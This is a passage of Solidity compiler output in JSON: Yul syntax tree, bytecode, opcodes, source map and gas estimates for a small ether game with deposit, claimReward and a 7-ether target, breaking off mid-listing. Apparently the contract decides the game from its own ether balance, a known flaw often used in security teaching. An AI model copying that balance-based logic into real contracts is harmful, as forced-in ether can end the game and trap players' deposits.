																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "588:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "588:21:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "588:21:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "629:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "640:2:1",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "625:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "625:18:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "645:2:1",
																		"type": "",
																		"value": "10"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "618:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "618:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "618:30:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "668:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "679:2:1",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "664:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "664:18:1"
																	},
																	{
																		"hexValue": "4e6f742077696e6e6572",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "684:12:1",
																		"type": "",
																		"value": "Not winner"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "657:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "657:40:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "657:40:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "706:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "718:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "729:2:1",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "714:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "714:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "706:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_bdc864de34e46c040c4d730398f4acbd8b64d0b5023c3fd84e9cf74a6ae62165__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "555:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "569:4:1",
														"type": ""
													}
												],
												"src": "404:334:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "934:14:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "936:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "943:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "936:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "918:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "926:3:1",
														"type": ""
													}
												],
												"src": "743:205:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1127:170:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1144:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1155:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1137:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1137:21:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1137:21:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1178:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1189:2:1",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1174:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1174:18:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1194:2:1",
																		"type": "",
																		"value": "20"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1167:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1167:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1167:30:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1217:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1228:2:1",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1213:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1213:18:1"
																	},
																	{
																		"hexValue": "4661696c656420746f2073656e64204574686572",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "1233:22:1",
																		"type": "",
																		"value": "Failed to send Ether"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1206:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1206:50:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1206:50:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1265:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1277:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1288:2:1",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1273:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1273:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1265:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1104:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1118:4:1",
														"type": ""
													}
												],
												"src": "953:344:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1476:175:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1493:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1504:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1486:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1486:21:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1486:21:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1527:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1538:2:1",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1523:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1523:18:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1543:2:1",
																		"type": "",
																		"value": "25"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1516:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1516:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1516:30:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1566:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1577:2:1",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1562:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1562:18:1"
																	},
																	{
																		"hexValue": "596f752063616e206f6e6c792073656e642031204574686572",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "1582:27:1",
																		"type": "",
																		"value": "You can only send 1 Ether"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1555:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1555:55:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1555:55:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1619:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1631:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1642:2:1",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1627:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1627:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1619:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_b2565c271bc1f6e9f3596c175513ca104086dfb78cd7419cc09c2779417406d9__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1453:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1467:4:1",
														"type": ""
													}
												],
												"src": "1302:349:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1830:162:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1847:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1858:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1840:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1840:21:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1840:21:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1881:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1892:2:1",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1877:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1877:18:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1897:2:1",
																		"type": "",
																		"value": "12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1870:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1870:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1870:30:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1920:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1931:2:1",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1916:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1916:18:1"
																	},
																	{
																		"hexValue": "47616d65206973206f766572",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "1936:14:1",
																		"type": "",
																		"value": "Game is over"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1909:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1909:42:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1909:42:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1960:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1972:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1983:2:1",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1968:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1968:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1960:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_7f7f9c6d78507162a8bd16acc136c0b03c63c36f951fc71dd07575081ba76683__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1807:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1821:4:1",
														"type": ""
													}
												],
												"src": "1656:336:1"
											}
										]
									},
									"contents": "{\n    { }\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, value0)\n    }\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, and(value0, sub(shl(160, 1), 1)))\n    }\n    function abi_encode_tuple_t_stringliteral_bdc864de34e46c040c4d730398f4acbd8b64d0b5023c3fd84e9cf74a6ae62165__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 10)\n        mstore(add(headStart, 64), \"Not winner\")\n        tail := add(headStart, 96)\n    }\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos) -> end\n    { end := pos }\n    function abi_encode_tuple_t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 20)\n        mstore(add(headStart, 64), \"Failed to send Ether\")\n        tail := add(headStart, 96)\n    }\n    function abi_encode_tuple_t_stringliteral_b2565c271bc1f6e9f3596c175513ca104086dfb78cd7419cc09c2779417406d9__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 25)\n        mstore(add(headStart, 64), \"You can only send 1 Ether\")\n        tail := add(headStart, 96)\n    }\n    function abi_encode_tuple_t_stringliteral_7f7f9c6d78507162a8bd16acc136c0b03c63c36f951fc71dd07575081ba76683__to_t_string_memory_ptr__fromStack_reversed(headStart) -> tail\n    {\n        mstore(headStart, 32)\n        mstore(add(headStart, 32), 12)\n        mstore(add(headStart, 64), \"Game is over\")\n        tail := add(headStart, 96)\n    }\n}",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040526004361061003f5760003560e01c8063953b8fb814610044578063b88a802f1461006d578063d0e30db014610084578063dfbf53ae1461008c575b600080fd5b34801561005057600080fd5b5061005a60005481565b6040519081526020015b60405180910390f35b34801561007957600080fd5b506100826100c4565b005b6100826101a2565b34801561009857600080fd5b506001546100ac906001600160a01b031681565b6040516001600160a01b039091168152602001610064565b6001546001600160a01b031633146101105760405162461bcd60e51b815260206004820152600a6024820152692737ba103bb4b73732b960b11b60448201526064015b60405180910390fd5b604051600090339047908381818185875af1925050503d8060008114610152576040519150601f19603f3d011682016040523d82523d6000602084013e610157565b606091505b505090508061019f5760405162461bcd60e51b81526020600482015260146024820152732330b4b632b2103a379039b2b7321022ba3432b960611b6044820152606401610107565b50565b34670de0b6b3a7640000146101f95760405162461bcd60e51b815260206004820152601960248201527f596f752063616e206f6e6c792073656e642031204574686572000000000000006044820152606401610107565b600054479081111561023c5760405162461bcd60e51b815260206004820152600c60248201526b23b0b6b29034b99037bb32b960a11b6044820152606401610107565b600054810361019f57600180546001600160a01b031916331790555056fea264697066735822122034205799ed3fe3af50765ebc66e8305e814b84eecb0569e88df7b4ccd66af4aa64736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x953B8FB8 EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0xB88A802F EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x84 JUMPI DUP1 PUSH4 0xDFBF53AE EQ PUSH2 0x8C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5A PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x82 PUSH2 0xC4 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x82 PUSH2 0x1A2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x98 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 SLOAD PUSH2 0xAC SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x64 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x110 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x2737BA103BB4B73732B9 PUSH1 0xB1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x0 SWAP1 CALLER SWAP1 SELFBALANCE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x152 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x157 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x19F JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x2330B4B632B2103A379039B2B7321022BA3432B9 PUSH1 0x61 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST POP JUMP JUMPDEST CALLVALUE PUSH8 0xDE0B6B3A7640000 EQ PUSH2 0x1F9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x19 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x596F752063616E206F6E6C792073656E64203120457468657200000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST PUSH1 0x0 SLOAD SELFBALANCE SWAP1 DUP2 GT ISZERO PUSH2 0x23C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xC PUSH1 0x24 DUP3 ADD MSTORE PUSH12 0x23B0B6B29034B99037BB32B9 PUSH1 0xA1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 SUB PUSH2 0x19F JUMPI PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLVALUE KECCAK256 JUMPI SWAP10 0xED EXTCODEHASH 0xE3 0xAF POP PUSH23 0x5EBC66E8305E814B84EECB0569E88DF7B4CCD66AF4AA64 PUSH20 0x6F6C634300080D00330000000000000000000000 ",
							"sourceMap": "62:632:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;88:34;;;;;;;;;;;;;;;;;;;160:25:1;;;148:2;133:18;88:34:0;;;;;;;;473:218;;;;;;;;;;;;;:::i;:::-;;159:306;;;:::i;129:21::-;;;;;;;;;;-1:-1:-1;129:21:0;;;;-1:-1:-1;;;;;129:21:0;;;;;;-1:-1:-1;;;;;360:32:1;;;342:51;;330:2;315:18;129:21:0;196:203:1;473:218:0;536:6;;-1:-1:-1;;;;;536:6:0;522:10;:20;514:43;;;;-1:-1:-1;;;514:43:0;;606:2:1;514:43:0;;;588:21:1;645:2;625:18;;;618:30;-1:-1:-1;;;664:18:1;;;657:40;714:18;;514:43:0;;;;;;;;;586:49;;571:9;;586:10;;609:21;;571:9;586:49;571:9;586:49;609:21;586:10;:49;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;570:65;;;654:4;646:37;;;;-1:-1:-1;;;646:37:0;;1155:2:1;646:37:0;;;1137:21:1;1194:2;1174:18;;;1167:30;-1:-1:-1;;;1213:18:1;;;1206:50;1273:18;;646:37:0;953:344:1;646:37:0;503:188;473:218::o;159:306::-;212:9;225:7;212:20;204:58;;;;-1:-1:-1;;;204:58:0;;1504:2:1;204:58:0;;;1486:21:1;1543:2;1523:18;;;1516:30;1582:27;1562:18;;;1555:55;1627:18;;204:58:0;1302:349:1;204:58:0;275:12;341;290:21;;330:23;;;322:48;;;;-1:-1:-1;;;322:48:0;;1858:2:1;322:48:0;;;1840:21:1;1897:2;1877:18;;;1870:30;-1:-1:-1;;;1916:18:1;;;1909:42;1968:18;;322:48:0;1656:336:1;322:48:0;398:12;;387:7;:23;383:75;;427:6;:19;;-1:-1:-1;;;;;;427:19:0;436:10;427:19;;;193:272;159:306::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "131200",
								"executionCost": "22283",
								"totalCost": "153483"
							},
							"external": {
								"claimReward()": "infinite",
								"deposit()": "28657",
								"targetAmount()": "2262",
								"winner()": "2381"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 115,
									"end": 122,
									"name": "PUSH",
									"source": 0,
									"value": "6124FEE993BC0000"
								},
								{
									"begin": 88,
									"end": 122,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 88,
									"end": 122,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 62,
									"end": 694,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 62,
									"end": 694,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122034205799ed3fe3af50765ebc66e8305e814b84eecb0569e88df7b4ccd66af4aa64736f6c634300080d0033",
									".code": [
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "953B8FB8"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "B88A802F"
										},
										{
											"begin": 62,
											"end": 694,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 62,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 62,
											"end": 694,
